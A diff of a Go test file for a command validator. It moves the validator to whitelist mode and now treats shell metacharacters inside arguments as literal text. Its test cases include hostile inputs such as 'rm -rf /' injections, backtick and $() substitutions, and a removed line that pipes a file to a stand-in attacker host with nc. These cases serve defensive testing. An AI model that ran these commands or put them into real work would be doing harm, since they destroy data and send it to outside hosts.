@@ -23,32 +23,67 @@ func TestCommandValidation(t *testing.T) {
 			reason:    "safe command should be allowed",
 		},
 		{
-			name:      "command with semicolon injection",
-			command:   "ls",
-			args:      []string{"; rm -rf /"},
-			shouldErr: true,
-			reason:    "command injection with semicolon should be blocked",
+			name:      "legitimate go build with ldflags",
+			command:   "go",
+			args:      []string{"build", "-ldflags=-X main.version=$VERSION"},
+			shouldErr: false,
+			reason:    "legitimate go build command with $ in args should be allowed (exec.Command treats $ as literal)",
 		},
 		{
-			name:      "command with pipe injection",
-			command:   "cat",
-			args:      []string{"file | nc attacker.com 1234"},
-			shouldErr: true,
-			reason:    "command injection with pipe should be blocked",
+			name:      "safe pipe character in argument",
+			command:   "echo",
+			args:      []string{"file | not-a-shell-command"},
+			shouldErr: false,
+			reason:    "pipe in argument is safe with exec.Command (treated as literal string)",
 		},
 		{
-			name:      "command with backtick injection",
+			name:      "safe backticks in argument",
 			command:   "echo",
 			args:      []string{"`whoami`"},
-			shouldErr: true,
-			reason:    "command injection with backticks should be blocked",
+			shouldErr: false,
+			reason:    "backticks in argument are safe with exec.Command (treated as literal string)",
 		},
 		{
-			name:      "command with $() injection",
+			name:      "safe $() in argument",
 			command:   "echo",
 			args:      []string{"$(whoami)"},
+			shouldErr: false,
+			reason:    "command substitution in argument is safe with exec.Command (treated as literal string)",
+		},
+		{
+			name:      "embedded dangerous command pattern in arg",
+			command:   "cat",
+			args:      []string{"rm -rf /"},
 			shouldErr: true,
-			reason:    "command injection with $() should be blocked",
+			reason:    "embedded dangerous command pattern should be blocked",
+		},
+		{
+			name:      "null byte in argument",
+			command:   "echo",
+			args:      []string{"hello\x00world"},
+			shouldErr: true,
+			reason:    "null byte in argument should be blocked (injection attack)",
+		},
+		{
+			name:      "extremely long argument",
+			command:   "echo",
+			args:      []string{string(make([]byte, 20000))},
+			shouldErr: true,
+			reason:    "extremely long argument should be blocked (DoS risk)",
+		},
+		{
+			name:      "rm command blocked by whitelist",
+			command:   "rm",
+			args:      []string{"file.txt"},
+			shouldErr: true,
+			reason:    "rm is not in whitelist (secure by default)",
+		},
+		{
+			name:      "empty command",
+			command:   "",
+			args:      []string{"arg1"},
+			shouldErr: true,
+			reason:    "empty command should be blocked",
 		},
 	}
 
@@ -65,9 +100,10 @@ func TestCommandValidation(t *testing.T) {
 	}
 }
 
-// TestStrictCommandValidator tests strict command validator (whitelist mode)
+// TestStrictCommandValidator tests command validator (whitelist mode)
+// NOTE: NewCommand() now uses whitelist mode by default for security
 func TestStrictCommandValidator(t *testing.T) {
-	validator := NewStrictCommand()
+	validator := NewCommand()
 
 	tests := []struct {
 		name      string
@@ -193,30 +229,63 @@ func TestCommandValidationEdgeCases(t *testing.T) {
 		command   string
 		args      []string
 		shouldErr bool
+		reason    string
 	}{
 		{
-			name:      "command with && operator",
-			command:   "ls",
-			args:      []string{"-la", "&&", "rm", "-rf", "/"},
-			shouldErr: true,
+			name:      "args with && operator but no dangerous pattern",
+			command:   "grep",
+			args:      []string{"pattern", "&&", "file.txt"},
+			shouldErr: false,
+			reason:    "&& in args is safe with exec.Command (treated as literal)",
 		},
 		{
-			name:      "command with || operator",
-			command:   "test",
-			args:      []string{"-f", "file", "||", "rm", "-rf", "/"},
-			shouldErr: true,
+			name:      "args with || operator but no dangerous pattern",
+			command:   "grep",
+			args:      []string{"pattern", "||", "file.txt"},
+			shouldErr: false,
+			reason:    "|| in args is safe with exec.Command (treated as literal)",
 		},
 		{
-			name:      "command with newline",
+			name:      "args containing dangerous pattern with newline",
 			command:   "echo",
 			args:      []string{"hello\nrm -rf /"},
 			shouldErr: true,
+			reason:    "embedded dangerous pattern 'rm -rf /' should be blocked even with newline",
 		},
 		{
 			name:      "safe args only",
 			command:   "cat",
 			args:      []string{"file.txt"},
 			shouldErr: false,
+			reason:    "safe command with safe args should be allowed",
+		},
+		{
+			name:      "args with redirection characters",
+			command:   "echo",
+			args:      []string{"output > file.txt"},
+			shouldErr: false,
+			reason:    "redirection in args is safe with exec.Command (treated as literal)",
+		},
+		{
+			name:      "args with semicolon but no dangerous pattern",
+			command:   "echo",
+			args:      []string{"hello; world"},
+			shouldErr: false,
+			reason:    "semicolon in args is safe with exec.Command (treated as literal)",
+		},
+		{
+			name:      "command name with pipe",
+			command:   "ls|cat",
+			args:      []string{},
+			shouldErr: true,
+			reason:    "pipe in command name should be blocked",
+		},
+		{
+			name:      "command name with shell metachar",
+			command:   "ls>file",
+			args:      []string{},
+			shouldErr: true,
+			reason:    "shell metacharacter in command name should be blocked",
 		},
 	}
 
@@ -224,10 +293,10 @@ func TestCommandValidationEdgeCases(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 			err := cmdValidator.ValidateCommand(tt.command, tt.args)
 			if tt.shouldErr && err == nil {
-				t.Errorf("expected error for %q, but got none", tt.name)
+				t.Errorf("expected error for %q, but got none: %s", tt.name, tt.reason)
 			}
 			if !tt.shouldErr && err != nil {
-				t.Errorf("unexpected error for %q: %v", tt.name, err)
+				t.Errorf("unexpected error for %q: %v (%s)", tt.name, err, tt.reason)
 			}
 		})
 	}
